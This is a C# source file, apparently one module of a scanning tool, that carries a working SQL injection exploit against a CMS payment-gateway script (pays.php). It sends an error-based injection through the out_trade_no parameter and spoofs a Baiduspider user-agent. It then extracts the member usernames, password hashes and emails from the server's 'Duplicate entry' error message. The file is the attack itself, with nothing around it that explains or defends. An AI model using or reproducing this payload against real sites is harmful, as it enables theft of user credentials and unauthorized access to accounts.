using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class cms08
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string exps = "/include/paygate/alipay/pays.php?out_trade_no=22%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28*%29,CONCAT%28%28SELECT%20concat%280x3a,mname,0x3a,password,0x3a,email,0x3a%29%20from%20cms_members%20limit%200,1%29,FLOOR%28RAND%280%29*2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%20AND%27";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + url;
				}
				string bb = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.UTF8
				}.DownloadString(urls + exps).Replace("\n", "").Replace("\r", "");
				int c = bb.IndexOf("Duplicate entry '");
				int d = bb.IndexOf("' for key 1");
				string shuju = bb.Substring(c + 17, d - c - 17);
				result = shuju;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
